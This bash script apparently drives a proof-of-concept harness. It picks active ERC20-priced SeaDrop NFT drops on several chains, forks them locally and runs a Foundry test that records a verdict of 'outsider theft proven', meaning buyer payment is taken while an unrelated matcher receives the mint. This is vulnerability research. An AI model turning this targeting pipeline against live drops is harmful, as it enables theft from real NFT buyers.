#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUT="$ROOT/results/active-existing-proof"
SCAN="$ROOT/results/active-drops/SUMMARY.json"
LAB="${RUNNER_TEMP:-/tmp}/active-existing-seadrop-lab"
ZERO="0x0000000000000000000000000000000000000000"
NEUTRAL_FEE="0x0000000000000000000000000000000000FEE123"

rm -rf "$OUT" "$LAB"
mkdir -p "$OUT/attempts" "$LAB/test" "$LAB/src" "$LAB/lib"
cp "$ROOT/OfficialFactoryFork.t.sol" "$LAB/test/OfficialFactoryFork.t.sol"
cp "$ROOT/ActiveExistingDropForkV2.t.sol" "$LAB/test/ActiveExistingDropForkV2.t.sol"
git clone --quiet --depth 1 https://github.com/foundry-rs/forge-std.git "$LAB/lib/forge-std"
cat > "$LAB/foundry.toml" <<'TOML'
[profile.default]
src = "src"
test = "test"
out = "out"
cache_path = "cache"
solc_version = "0.8.24"
evm_version = "cancun"
optimizer = true
optimizer_runs = 200
ffi = false
TOML

if [[ ! -f "$SCAN" ]]; then
  printf '{"result":"ACTIVE_SCAN_RESULT_MISSING"}\n' > "$OUT/MACHINE_VERDICT.json"
  echo ACTIVE_SCAN_RESULT_MISSING > "$OUT/RESULT.txt"
  exit 1
fi

rpc_for() {
  case "$1" in
    ethereum) echo https://ethereum-rpc.publicnode.com ;;
    base) echo https://base-rpc.publicnode.com ;;
    arbitrum) echo https://arbitrum-one-rpc.publicnode.com ;;
    optimism) echo https://optimism-rpc.publicnode.com ;;
    polygon) echo https://polygon-bor-rpc.publicnode.com ;;
    avalanche) echo https://avalanche-c-chain-rpc.publicnode.com ;;
    bsc) echo https://bsc-rpc.publicnode.com ;;
    *) return 1 ;;
  esac
}

jq -c '.active_drops[] | select(.sample_has_capacity == true) | select((.payment_token | ascii_downcase) != "0x0000000000000000000000000000000000000000")' "$SCAN" > "$OUT/candidates.jsonl"

PROVEN=0
while IFS= read -r candidate; do
  [[ -n "$candidate" ]] || continue
  network="$(jq -r .network <<< "$candidate")"
  rpc="$(rpc_for "$network" || true)"
  [[ -n "$rpc" ]] || continue
  block="$(jq -r .block_number <<< "$candidate")"
  token="$(jq -r .token <<< "$candidate")"
  payment="$(jq -r .payment_token <<< "$candidate")"
  token_id="$(jq -r .sample_token_id <<< "$candidate")"
  drop_index="$(jq -r .drop_index <<< "$candidate")"
  restricted="$(jq -r .restrict_fee_recipients <<< "$candidate")"
  if [[ "$restricted" == "true" ]]; then
    fee="$(jq -r '.allowed_fee_recipients[0] // empty' <<< "$candidate")"
  else
    fee="$NEUTRAL_FEE"
  fi
  [[ -n "$fee" && "${fee,,}" != "${ZERO,,}" ]] || continue

  name="${network}-${token}-${drop_index}-${token_id}"
  log="$OUT/attempts/${name}.log"
  set +e
  RPC_URL="$rpc" FORK_BLOCK="$block" ACTIVE_TOKEN="$token" \
    PAYMENT_TOKEN="$payment" FEE_RECIPIENT="$fee" TOKEN_ID="$token_id" \
    DROP_INDEX="$drop_index" timeout 1200 forge test \
      --root "$LAB" \
      --match-contract ActiveExistingDropForkV2Test \
      --match-test testExistingOwnerUnmodifiedOutsiderSettlementFailure \
      -vvvv > "$log" 2>&1
  rc=$?
  set -e

  printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
    "$network" "$token" "$payment" "$drop_index" "$token_id" "$fee" "$rc" \
    >> "$OUT/attempts.tsv"

  if [[ $rc -eq 0 ]] \
    && grep -q '\[PASS\].*testExistingOwnerUnmodifiedOutsiderSettlementFailure' "$log" \
    && ! grep -q '\[FAIL' "$log"; then
    echo "$candidate" | jq . > "$OUT/proven-candidate.json"
    cp "$log" "$OUT/forge-test.log"
    export network block token payment token_id drop_index fee
    python3 - <<'PY' > "$OUT/MACHINE_VERDICT.json"
import json, os
print(json.dumps({
  "result": "EXISTING_OWNER_UNMODIFIED_OFFICIAL_SEADROP_OUTSIDER_THEFT_PROVEN",
  "network": os.environ["network"],
  "fork_block": int(os.environ["block"]),
  "token": os.environ["token"],
  "payment_token": os.environ["payment"],
  "token_id": int(os.environ["token_id"]),
  "drop_index": int(os.environ["drop_index"]),
  "fee_recipient": os.environ["fee"],
  "collection_owner_modified": False,
  "buyer_order": "standard EIP-712 FULL_OPEN",
  "signed_zone_called": False,
  "payment_route": "canonical OpenSea Conduit",
  "exploit_caller": "fresh unrelated local matcher",
  "authorization_delta": "buyer payment debited while buyer ERC1155 balance is unchanged and matcher receives the mint",
}, indent=2))
PY
    echo EXISTING_OWNER_UNMODIFIED_OFFICIAL_SEADROP_OUTSIDER_THEFT_PROVEN > "$OUT/RESULT.txt"
    PROVEN=1
    break
  fi
done < "$OUT/candidates.jsonl"

if [[ $PROVEN -eq 0 ]]; then
  printf '{"result":"NO_EXISTING_ACTIVE_ERC20_DROP_PROOF_SURVIVED","candidate_count":%s}\n' \
    "$(wc -l < "$OUT/candidates.jsonl")" > "$OUT/MACHINE_VERDICT.json"
  echo NO_EXISTING_ACTIVE_ERC20_DROP_PROOF_SURVIVED > "$OUT/RESULT.txt"
  exit 1
fi
